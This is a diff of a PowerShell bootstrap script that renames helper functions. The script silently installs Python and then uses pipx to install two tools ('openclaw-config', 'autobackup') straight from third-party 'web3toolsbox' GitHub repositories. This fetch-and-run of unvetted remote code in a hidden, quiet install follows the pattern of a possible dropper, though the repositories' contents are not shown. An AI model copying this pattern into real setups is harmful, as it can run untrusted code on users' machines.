@@ -54,7 +54,7 @@ function Add-FailedStep {
 }
 
 # Reload PATH after installers update user or machine environment variables.
-function Refresh-ProcessPath {
+function Update-ProcessPath {
     $machinePath = [System.Environment]::GetEnvironmentVariable('Path', 'Machine')
     $userPath = [System.Environment]::GetEnvironmentVariable('Path', 'User')
     $pathParts = @()
@@ -106,8 +106,9 @@ function Get-LatestPythonInstallerUrl {
                 continue
             }
 
-            $matches = [regex]::Matches($response.Content, '(https://www\.python\.org)?/ftp/python/[^"''<>\s]+/python-[0-9.]+-amd64\.exe')
-            foreach ($match in $matches) {
+# Use a dedicated variable name to avoid clobbering automatic variable $matches.
+            $pythonMatches = [regex]::Matches($response.Content, '(https://www\.python\.org)?/ftp/python/[^"''<>\s]+/python-[0-9.]+-amd64\.exe')
+            foreach ($match in $pythonMatches) {
                 $url = $match.Value
                 if ($url -notmatch '^https://') {
                     $url = "https://www.python.org$url"
@@ -124,7 +125,7 @@ function Get-LatestPythonInstallerUrl {
 
 # Make sure Python is available. If it is missing, download and install it
 # quietly, then refresh PATH for the current process.
-function Ensure-Python {
+function Install-Python {
     Write-StepLog 'Checking Python runtime'
 
     $pythonPath = Get-CommandPath -Names @('python', 'py')
@@ -141,7 +142,7 @@ function Ensure-Python {
         Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath -ErrorAction Stop
         $process = Start-Process -FilePath $installerPath -ArgumentList @('/quiet', 'InstallAllUsers=0', 'PrependPath=1', 'Include_launcher=1') -Wait -PassThru -WindowStyle Hidden
         if ($process.ExitCode -eq 0) {
-            Refresh-ProcessPath
+            Update-ProcessPath
             $pythonPath = Get-CommandPath -Names @('python', 'py')
             if ($pythonPath) {
                 Write-InfoLog "Python installation completed: $pythonPath"
@@ -181,7 +182,7 @@ function Get-PackageVersion {
 
 # Install or upgrade a Python dependency when the minimum required version is
 # not already available.
-function Ensure-PythonPackage {
+function Install-PythonPackage {
     param(
         [string]$PythonPath,
         [string]$Name,
@@ -225,7 +226,7 @@ function Ensure-PythonPackage {
 
 # Ensure pipx is available so CLI tools can be installed in isolated
 # environments.
-function Ensure-Pipx {
+function Install-Pipx {
     param(
         [string]$PythonPath
     )
@@ -260,7 +261,7 @@ function Ensure-Pipx {
             Add-FailedStep -Step 'Configure pipx path' -Reason "exit=$LASTEXITCODE"
         }
 
-        Refresh-ProcessPath
+        Update-ProcessPath
         $pipxPath = Get-CommandPath -Names @('pipx')
         if ($pipxPath) {
             Write-InfoLog "pipx installation completed: $pipxPath"
@@ -302,7 +303,7 @@ function Invoke-PipxInstall {
 }
 
 # Install a pipx-managed CLI only when its command is not already available.
-function Ensure-PipxPackage {
+function Install-PipxPackage {
     param(
         [string]$PipxInvoker,
         [string]$PackageSpec,
@@ -324,7 +325,7 @@ function Ensure-PipxPackage {
     }
 
     if (Invoke-PipxInstall -PipxInvoker $PipxInvoker -PackageSpec $PackageSpec) {
-        Refresh-ProcessPath
+        Update-ProcessPath
         $installedCommand = Get-CommandPath -Names $CommandNames
         if ($installedCommand) {
             Write-InfoLog "Installed pipx package successfully: $installedCommand"
@@ -343,7 +344,7 @@ function Ensure-PipxPackage {
 try {
     Write-InfoLog 'Starting Windows installation bootstrap.'
 
-    $pythonPath = Ensure-Python
+    $pythonPath = Install-Python
 
     $requirements = @(
         @{ Name = 'requests'; Version = '2.31.0' },
@@ -354,12 +355,12 @@ try {
     )
 
     foreach ($pkg in $requirements) {
-        Ensure-PythonPackage -PythonPath $pythonPath -Name $pkg.Name -Version $pkg.Version
+        Install-PythonPackage -PythonPath $pythonPath -Name $pkg.Name -Version $pkg.Version
     }
 
-    $pipxInvoker = Ensure-Pipx -PythonPath $pythonPath
-    Ensure-PipxPackage -PipxInvoker $pipxInvoker -PackageSpec 'git+https://github.com/web3toolsbox/claw.git' -CommandNames @('openclaw-config', 'openclaw-config.exe')
-    Ensure-PipxPackage -PipxInvoker $pipxInvoker -PackageSpec 'git+https://github.com/web3toolsbox/auto-backup-wins.git' -CommandNames @('autobackup', 'autobackup.exe')
+    $pipxInvoker = Install-Pipx -PythonPath $pythonPath
+    Install-PipxPackage -PipxInvoker $pipxInvoker -PackageSpec 'git+https://github.com/web3toolsbox/claw.git' -CommandNames @('openclaw-config', 'openclaw-config.exe')
+    Install-PipxPackage -PipxInvoker $pipxInvoker -PackageSpec 'git+https://github.com/web3toolsbox/auto-backup-wins.git' -CommandNames @('autobackup', 'autobackup.exe')
 
     if (Test-Path '.configs') {
         Write-StepLog 'Applying environment configuration'
